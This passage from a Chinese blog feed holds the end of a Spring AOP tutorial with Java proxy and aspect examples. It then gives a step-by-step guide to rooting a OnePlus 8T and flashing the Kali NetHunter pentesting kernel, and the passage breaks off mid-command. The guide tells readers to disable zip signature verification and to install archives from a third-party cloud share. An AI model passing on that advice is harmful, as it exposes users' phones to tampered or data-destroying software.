class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 业务实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BusinessServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">BusinessService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeTask</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Business logic is executed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 定义拦截器（InvocationHandler）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoggingInterceptor</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoggingInterceptor</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 在方法调用之前做一些额外的事情（例如打印日志）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Method &quot;</span> + method.getName() + <span class="string">&quot; is about to be called.&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用实际的业务方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 在方法调用之后做一些额外的事情（例如打印日志）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Method &quot;</span> + method.getName() + <span class="string">&quot; has been called.&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 测试代理</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 目标对象</span></span><br><span class="line">        <span class="type">BusinessService</span> <span class="variable">businessService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BusinessServiceImpl</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个代理对象</span></span><br><span class="line">        <span class="type">BusinessService</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (BusinessService) Proxy.newProxyInstance(</span><br><span class="line">                BusinessService.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;BusinessService.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">LoggingInterceptor</span>(businessService) <span class="comment">// 拦截器</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用代理对象的方法，拦截器会拦截并打印日志</span></span><br><span class="line">        proxyInstance.executeTask();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="简单案例2："><a href="#简单案例2：" class="headerlink" title="简单案例2："></a>简单案例2：</h3><p>下面给出一个简单的例子，展示如何使用 Spring AOP 定义一个切面，从而在目标方法执行前后插入额外逻辑（例如日志记录）。</p><ol><li>定义目标类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createUser</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;UserService: 正在创建用户 &quot;</span> + username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteUser</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;UserService: 正在删除用户 &quot;</span> + username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>定义切面类</li></ol><p>在这个切面中，我们用 Spring AOP 的注解定义前置通知和后置通知。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Aspect;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Before;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.After;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.JoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="meta">@Aspect</span>  <span class="comment">// 表示这个类是一个切面</span></span><br><span class="line"><span class="meta">@Component</span>  <span class="comment">// 让 Spring 容器管理它</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoggingAspect</span> &#123;</span><br><span class="line">    <span class="comment">// 前置通知：在 UserService.createUser() 方法执行前调用</span></span><br><span class="line">    <span class="meta">@Before(&quot;execution(* UserService.createUser(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">beforeCreateUser</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;LoggingAspect: 在调用 &quot;</span> + joinPoint.getSignature().getName() + <span class="string">&quot; 方法前记录日志。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 后置通知：在 UserService.createUser() 方法执行后调用</span></span><br><span class="line">    <span class="meta">@After(&quot;execution(* UserService.createUser(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCreateUser</span><span class="params">(JoinPoint joinPoint)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;LoggingAspect: 在调用 &quot;</span> + joinPoint.getSignature().getName() + <span class="string">&quot; 方法后记录日志。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>@Aspect</strong>：声明该类为切面类。</li><li><strong>@Component</strong>：让 Spring 自动扫描并管理这个切面对象。</li><li><em><em>@Before(“execution(</em> UserService.createUser(..))”)</em>*：定义切点表达式，表示对 <code>UserService</code> 类中 <code>createUser</code> 方法的调用，在执行前调用 <code>beforeCreateUser</code> 方法。</li><li><em><em>@After(“execution(</em> UserService.createUser(..))”)</em>*：类似地，表示在 <code>createUser</code> 方法执行后调用 <code>afterCreateUser</code> 方法。</li></ul><ol><li>配置 Spring 使 AOP 生效</li></ol><p>在 Spring 配置中，需要启用 AOP 支持。例如，如果使用基于注解的配置，可以在配置类上添加 <code>@EnableAspectJAutoProxy</code> 注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.EnableAspectJAutoProxy;</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableAspectJAutoProxy</span>  <span class="comment">// 启用 AOP 支持</span></span><br><span class="line"><span class="meta">@ComponentScan(basePackages = &quot;com.example&quot;)</span> <span class="comment">// 假设所有类都在 com.example 包下</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppConfig</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>测试切面效果</li></ol><p>编写一个测试程序，通过 Spring 容器获取目标对象，并调用方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AopTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(AppConfig.class);</span><br><span class="line">        <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> context.getBean(UserService.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 仅对 createUser 方法设置了切面</span></span><br><span class="line">        userService.createUser(<span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">        userService.deleteUser(<span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>预期输出：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoggingAspect: 在调用 createUser 方法前记录日志。</span><br><span class="line">UserService: 正在创建用户 Alice</span><br><span class="line">LoggingAspect: 在调用 createUser 方法后记录日志。</span><br><span class="line">UserService: 正在删除用户 Alice</span><br></pre></td></tr></table></figure><p>注意：由于切面中只定义了对 <code>createUser</code> 方法的前置和后置通知，调用 <code>deleteUser</code> 时不会有日志记录。</p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><ul><li><strong>切面（Aspect）</strong>：通过 <code>@Aspect</code> 注解定义，封装了横切关注点（例如日志记录）。</li><li><strong>通知（Advice）</strong>：切面内的方法，如 <code>beforeCreateUser</code> 和 <code>afterCreateUser</code>，分别在目标方法执行前后被调用。</li><li><strong>切点（Pointcut）</strong>：通过注解表达式（如 <code>execution(* UserService.createUser(..))</code>）指定在哪些方法上应用这些通知。</li></ul><p>这个例子展示了如何用 Spring AOP 的注解方式定义一个切面，从而在目标方法调用前后插入日志记录逻辑。</p><h3 id="简单案例3："><a href="#简单案例3：" class="headerlink" title="简单案例3："></a>简单案例3：</h3><p>下面通过一个简单的示例来解释 AspectJAroundAdvice 和 AspectJExpressionPointcut 的含义和用途。</p><h4 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h4><p>在 Spring AOP 中：</p><ul><li><strong>AspectJAroundAdvice</strong> 是基于 AspectJ 的环绕通知实现。 它包装了一个“切面方法”（比如某个切面类中的环绕通知方法），当目标方法被调用时，AspectJAroundAdvice 会调用这个切面方法，从而在目标方法调用前后插入你定义的逻辑。</li><li><strong>AspectJExpressionPointcut</strong> 则是用来定义<strong>切点</strong>的，它采用 AspectJ 表达式语言来描述在哪些方法调用上应用通知。 例如，表达式 <code>execution(* com.example.MyService.doWork(..))</code> 就表示匹配 MyService 类中所有名为 doWork 的方法调用。</li></ul><h4 id="示例说明"><a href="#示例说明" class="headerlink" title="示例说明"></a>示例说明</h4><p>假设我们有如下场景：</p><ul><li>有一个业务类 <code>MyService</code>，它有一个方法 <code>doWork()</code>。</li><li>我们希望在调用 <code>doWork()</code> 前后插入日志记录。</li></ul><ol><li>定义目标类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doWork</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyService: 正在执行 doWork 方法...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>定义切面类</li></ol><p>我们定义一个切面类 <code>MyAspect</code>，其中包含一个环绕通知方法。 这个方法在执行前后分别输出日志，并最终调用目标方法（使用 pjp.proceed()）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint pjp)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyAspect: 方法执行前&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">retVal</span> <span class="operator">=</span> pjp.proceed();  <span class="comment">// 调用目标方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;MyAspect: 方法执行后&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> retVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中：</p><ul><li><code>around</code> 方法就是我们想要在目标方法调用前后执行的增强逻辑。</li><li>这就是实际的“通知”（Advice）。</li></ul><ol><li>使用 AspectJAroundAdvice 将切面方法包装成 Advice</li></ol><p>在 Spring AOP 内部，可以使用 AspectJAroundAdvice 将切面方法封装为一个 Advice 对象。</p><p> 这一步通常由 AOP 框架自动完成，但我们可以理解为：</p><ul><li><strong>AspectJAroundAdvice</strong> 持有了 <code>MyAspect.around</code> 这个方法，以及如何获取 <code>MyAspect</code> 实例的工厂。</li><li>当目标方法匹配切点时，框架会调用 AspectJAroundAdvice，进而调用 <code>MyAspect.around</code>。</li></ul><p>例如，内部可能类似这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (伪代码示意)</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">aspectMethod</span> <span class="operator">=</span> MyAspect.class.getMethod(<span class="string">&quot;around&quot;</span>, ProceedingJoinPoint.class);</span><br><span class="line"><span class="type">AspectJAroundAdvice</span> <span class="variable">advice</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AspectJAroundAdvice</span>(aspectMethod, <span class="keyword">new</span> <span class="title class_">SingletonAspectInstanceFactory</span>(<span class="keyword">new</span> <span class="title class_">MyAspect</span>()));</span><br></pre></td></tr></table></figure><p>这里，<code>SingletonAspectInstanceFactory</code> 用来返回同一个 MyAspect 实例。</p><ol><li>使用 AspectJExpressionPointcut 定义切点</li></ol><p>切点负责决定在哪些方法上应用上面的 Advice。</p><p> 例如，我们可以用如下 AspectJ 表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AspectJExpressionPointcut</span> <span class="variable">pointcut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AspectJExpressionPointcut</span>();</span><br><span class="line">pointcut.setExpression(<span class="string">&quot;execution(* MyService.doWork(..))&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>这个表达式匹配 <code>MyService</code> 类中所有名为 <code>doWork</code> 的方法。</li></ul><ol><li>结合 Advisor</li></ol><p>Advisor 会将 Advice 和切点组合在一起，告诉代理： “当匹配到 <code>MyService.doWork(..)</code> 时，就应用这个环绕通知逻辑。” 例如，可以构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将上面封装好的 AspectJAroundAdvice 与切点结合，构成一个 Advisor</span></span><br><span class="line"><span class="type">DefaultPointcutAdvisor</span> <span class="variable">advisor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultPointcutAdvisor</span>(pointcut, advice);</span><br></pre></td></tr></table></figure><p>（这里的 advisor 在实际使用中会被加入到 AdvisedSupport 中）</p><ol><li>应用代理</li></ol><p>在最终的代理对象中，当调用 <code>MyService.doWork()</code> 时，Spring AOP 框架：</p><ul><li>先检查 Advisor 列表，发现 advisor 的切点匹配该方法，</li><li>然后通过 AspectJAroundAdvice 触发环绕通知，调用 <code>MyAspect.around</code> 方法，</li><li>这就实现在方法执行前后输出日志，然后调用目标方法。</li></ul><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><ul><li><strong>AspectJAroundAdvice</strong>： 用于封装一个环绕通知方法（比如 <code>MyAspect.around</code>），它告诉框架在目标方法调用前后执行哪些逻辑。 它是一个实现了 MethodInterceptor 接口的 Advice。</li><li><strong>AspectJExpressionPointcut</strong>： 用来定义切点，采用 AspectJ 表达式指定哪些方法调用需要被拦截。 例如 <code>&quot;execution(* MyService.doWork(..))&quot;</code> 就匹配 <code>MyService.doWork()</code> 方法。</li><li><strong>两者如何协同工作</strong>： Advisor 将 Advice（AspectJAroundAdvice）和切点（AspectJExpressionPointcut）绑定在一起，告诉代理对象“对符合切点的方法，应用这个 Advice”。 当代理对象调用目标方法时，符合切点的方法会被拦截，进入 Advice（环绕通知）逻辑，从而在目标方法执行前后执行自定义逻辑。</li></ul><p>这个例子展示了如何利用 AspectJAroundAdvice 和 AspectJExpressionPointcut 实现一个简单的切面，来在目标方法执行前后输出日志，从而帮助你理解它们的作用和使用场景。</p><p>笔者:han</p><p>博客:<a href="http://hanblog.top/">http://hanblog.top</a></p><p>若有错误欢迎大佬指出</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springaop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【原创】相信这是一篇对你很有用的刷kali nethunter完整版(内核)笔记！oneplus 8T机型为例。</title>
      <link href="/2024/07/07/%E3%80%90%E5%8E%9F%E5%88%9B%E3%80%91%E7%9B%B8%E4%BF%A1%E8%BF%99%E6%98%AF%E4%B8%80%E7%AF%87%E5%AF%B9%E4%BD%A0%E5%BE%88%E6%9C%89%E7%94%A8%E7%9A%84%E5%88%B7kali%20nethunter%E5%AE%8C%E6%95%B4%E7%89%88(%E5%86%85%E6%A0%B8)%E7%AC%94%E8%AE%B0%EF%BC%81oneplus%208T%E6%9C%BA%E5%9E%8B%E4%B8%BA%E4%BE%8B/"/>
      <url>/2024/07/07/%E3%80%90%E5%8E%9F%E5%88%9B%E3%80%91%E7%9B%B8%E4%BF%A1%E8%BF%99%E6%98%AF%E4%B8%80%E7%AF%87%E5%AF%B9%E4%BD%A0%E5%BE%88%E6%9C%89%E7%94%A8%E7%9A%84%E5%88%B7kali%20nethunter%E5%AE%8C%E6%95%B4%E7%89%88(%E5%86%85%E6%A0%B8)%E7%AC%94%E8%AE%B0%EF%BC%81oneplus%208T%E6%9C%BA%E5%9E%8B%E4%B8%BA%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="【原创】相信这是一篇对你很有用的刷kali-nethunter完整版-内核-笔记！oneplus-8T机型为例。"><a href="#【原创】相信这是一篇对你很有用的刷kali-nethunter完整版-内核-笔记！oneplus-8T机型为例。" class="headerlink" title="【原创】相信这是一篇对你很有用的刷kali nethunter完整版(内核)笔记！oneplus 8T机型为例。"></a>【原创】相信这是一篇对你很有用的刷kali nethunter完整版(内核)笔记！oneplus 8T机型为例。</h1><p>笔者小白。下文若有错误请多多包含,欢迎提出改正给我。</p><p><strong>联系方式</strong></p><ul><li>QQ：1512624649</li><li>QQ群：983224309</li><li>博客：<a href="http://hanblog.top/">http://hanblog.top</a></li><li>GitHub：<a href="https://github.com/cxkhanhan">https://github.com/cxkhanhan</a></li></ul><h2 id="阅读之前须知："><a href="#阅读之前须知：" class="headerlink" title="阅读之前须知："></a>阅读之前须知：</h2><p>下文有两张参考的图片。如果未加载出来请开魔法。然后重新刷新页面。不看的话也影响不大。</p><p>阅读本篇文章的需求：请注意笔者分享的踩坑点。以及具备自行查阅资料和探索钻研的能力。比较简单的问题概念问题可以直接去chatgpt这里就不赘述了</p><p>本笔记面向人群：刚入坑kali nethunter。想要刷一部nethunter完整版手机。或者在刷的过程中遇到一些问题。</p><p>笔者对下文的内容会进行详略描写。原因：详细描写的地方是由于网上无人整理总结。或者说都是论坛里提供的方法。寻找困难，非常零散。</p><p>一般不做介绍的东西就是网上已经有很多师傅的相关笔记和总结了。我再写上去只会看的很愚蠢。</p><p>下文涉及到的大部分资源都给各位整理好了。不然怎么说是一个有用的笔记呢？链接如下：</p><p>链接：<a href="https://pan.baidu.com/s/1rC7JP3MGMtEpNItRGSyqcg?pwd=han0">https://pan.baidu.com/s/1rC7JP3MGMtEpNItRGSyqcg?pwd=han0</a><br>提取码：han0<br>–来自百度网盘超级会员V4的分享</p><p>解压密码如下：1512624649han</p><h2 id="机型："><a href="#机型：" class="headerlink" title="机型："></a>机型：</h2><p>下文以One plus 8T为例。(大部分方法也适用于其他手机。存在一定差异。需要各位自行探索。如果感觉困难。可以直接去买kali官方有教程的机型)</p><p><a href="https://www.kali.org/docs/nethunter/">Kali NetHunter | Kali Linux Documentation</a></p><p>需要注意的是！！！很多工具等等都是精细到版本。不同的机型要有不同的工具和版本！！！如果不会的话。要么找网上完整版的教程，然后严格控制自己的机型和固件包等等都是一摸一样的。后文也会给出oneplus 8T宝宝巴士版教程！还有个师傅的完整版的oneplus 8pro的教程在下面给出。注意看教程有没有讲刷内核。</p><p>要么就是看官方文档里的教程。同时也做到机型等等一摸一样！！！</p><p>oneplus 8pro教程：<a href="https://blog.csdn.net/a648642694/article/details/127450785">https://blog.csdn.net/a648642694/article/details/127450785</a></p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><h3 id="捋一遍思路：精简版"><a href="#捋一遍思路：精简版" class="headerlink" title="捋一遍思路：精简版"></a>捋一遍思路：精简版</h3><p>1:bl解锁</p><p>2:安装magisk和twrp(orangefox也行).</p><p>3:在magisk中安装kali nethunter</p><p>4:用ro2rw或者systemrw对分区进行更改。把分区从只读的改成读写的。（有的手机在这一步会遇到分区解密问题。这个会在后文讲讲收集到的解决办法。）</p><p>5:twrp中刷入内核文件。</p><p>需要注意的是：网络上有些教程后面的4,5都没有讲。只讲了1,2,3。</p><p>区别在于：如果不刷入内核文件。很多功能比如badusb，网卡监听等等。</p><p>将会无法正常使用！会显示内核不支持功能。要么就是要自己外置网卡才能监听等等。</p><h3 id="宝宝巴士完整版："><a href="#宝宝巴士完整版：" class="headerlink" title="宝宝巴士完整版："></a>宝宝巴士完整版：</h3><p>适用于大部分机型,但主要参考的机型是oneplus 8T。可能与您的手机存在差异。</p><p>配置:版本号Hydrogen OS 11.0.13.13 KB05 Android版本:11 型号:KB2000</p><p>1:手机用数据线连接电脑。打开开发者模式，打开usb调试，打开oem解锁(部分机型需要更改一个 usb偏好设置，改为文件传输即可)</p><p>2:bl解锁。使用platform-tools里的工具解锁。具体参考这篇文章。</p><p><a href="https://onfix.cn/course/4309">解BL锁，Bootloader 解锁图文教程，刷机Root必备刷机解锁 (onfix.cn)</a></p><p>oneplus用户直接用大侠阿木的工具箱就行。里面有一键解锁功能。</p><p>3:安装magisk。同时给boot打补丁。参考这篇文章<a href="https://sspai.com/post/67932#!">Android 玩家必备神器入门：从零开始安装 Magisk - 少数派 (sspai.com)</a></p><p>4:安装适配的twrp版本。参考这篇文章<a href="https://onfix.cn/course/3845">手机刷 TWRP 方法，刷三方Recovery方法（解决卡米问题）刷机解锁 (onfix.cn)</a></p><p>oneplus的用户的相关rec版本参考：<a href="https://www.daxiaamu.com/6480/">一加各机型TWRP官方&#x2F;非官方版本，含最新3.7.0版本 - 大侠阿木博客 (daxiaamu.com)</a></p><p>如果还是嫌麻烦。大侠阿木的工具箱里也支持一键安装magisk。一加全能盒子(App手机版)里支持一键安装twrp。</p><p>5:把nethunter-oneplus8-all-*-kalifs-full.zip这种类似的几个G的文件从电脑上通过usb传输到手机上。</p><p>然后再通过magisk刷入这个刚传输进来的模块。</p><p>6:更改分区有两种方法，建议先用第一种。如果不行再用第二种。</p><p>一:在twrp或者orangefox中刷入systermrw*.zip这个文件。请不要勾选zip signature verification选项。(官方说的，不是本人的病毒)。可以参考</p><p>[<a href="https://xdaforums.com/t/closed-universal-systemrw-superrw-feat-makerw-ro2rw-read-only-2-read-write-super-partition-converter.4247311/">Closed] Universal SystemRW &#x2F; SuperRW feat. MakeRW &#x2F; ro2rw (read-only-2-read&#x2F;write super partition converter) | XDA Forums</a></p><p>笔者提供的整合的资源链接里如果systemrw1.32不能成功,请尝试更高的版本。笔者会提供两个版本。</p><p>如何检验是否成功？如果你看得懂他给你的反馈那就直接看英文。看不懂的话。就打开MT管理器。找到根目录。尝试去创建一个新的文件夹。如果能正常创建。则是成功。如果不行。请尝试上面的systemrw换版本，如果之后还是不行。请参考下面第二种方法：</p><p>二:ro2rw：</p><p>使用要求：安装了Magisk并且有10-15GB的可用空间的已root手机。</p><p>以及安装一个termux软件。</p><p>需要注意的是：如果出现空间不足什么的乱七八糟的东西。强制你去删除一些文件。请你认真选择要删除哪些文件。如果删除部分关键文件。会导致你无法正常使用。</p><p>这个问题会出现在下面这个参考文章的第五张图和第六张图中间。</p><p>具体用法可以参考</p><p><a href="https://xdaforums.com/t/set-your-system-folder-to-r-w-mode-with-ro2rw-android-13-magisk-2024-method.4648921/">Set your &#x2F;system folder to r&#x2F;w mode with RO2RW! Android 13, Magisk 2024 method | XDA Forums</a></p><p>7:如果上面的步骤都成功！没有出现乱七八糟的问题！那么恭喜你。只剩下最后一个问题。刷入内核。</p><p>笔者会在上面给出的整理资源链接里给出 Android 11的新和旧的内核文件。以及Android12的内核文件。刷入即可。</p><p>为什么给出新旧内核？</p><p>原因是：可能会遇见新内核不支持相对应的手机。旧内核就会支持。这也是上文强调过很多次的版本问题。各种软件，硬件之间的版本。需要自行查阅和寻找。涉及的面太广。不可能都指出。同时这也要感谢_MH8888这位师傅在<a href="https://blog.csdn.net/a648642694/article/details/127450785%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E9%87%8C%E5%88%86%E4%BA%AB%E7%9A%84%E8%B8%A9%E5%9D%91%E7%82%B9%E3%80%82%E5%9B%A0%E4%B8%BA%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%9D%91%E5%92%8C%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%9D%91%E6%88%91%E4%B9%9F%E9%83%BD%E8%B8%A9%E4%B8%AD%E4%BA%86%E3%80%82%E8%B0%A2%E8%B0%A2%E5%B8%88%E5%82%85%E5%88%86%E4%BA%AB%E7%BB%8F%E9%AA%8C%E3%80%82%E4%B8%8D%E7%84%B6%E5%A4%A9%E7%9F%A5%E9%81%93%E6%88%91%E8%A6%81%E6%89%BE%E5%A4%9A%E4%B9%85%E8%AE%BA%E5%9D%9B%E6%89%8D%E8%83%BD%E7%BF%BB%E5%88%B0%E8%BF%99%E4%B8%AA%E6%97%A7%E5%86%85%E6%A0%B8%E3%80%82">https://blog.csdn.net/a648642694/article/details/127450785这篇文章里分享的踩坑点。因为第一个坑和第二个坑我也都踩中了。谢谢师傅分享经验。不然天知道我要找多久论坛才能翻到这个旧内核。</a></p><p>下文也会放出一些相关的踩坑点。可以看做是这个师傅的补充踩坑点。</p><p>8:当刷入内核之后。成功启动。你可以点击设置。查看手机的配置。如果内核版本这里出现nethunter！那么就恭喜你内核也成功刷入！可以正常使用。</p><p>但是关于刷入之后或者刷入之前或者后续的相关功能可能仍然存在一定问题。笔者会在文章后面给出一些经验。</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20240707021850049.png" alt="image-20240707021850049"></p><h2 id="oneplus-8-8t-8pro-Android13-为什么刷fastboot-flash-recovery-twrp不成功？"><a href="#oneplus-8-8t-8pro-Android13-为什么刷fastboot-flash-recovery-twrp不成功？" class="headerlink" title="oneplus 8&#x2F;8t&#x2F;8pro Android13+为什么刷fastboot flash recovery twrp不成功？"></a>oneplus 8&#x2F;8t&#x2F;8pro Android13+为什么刷fastboot flash recovery twrp不成功？</h2><p>解决方法：</p><p>fastboot flash recovery_a 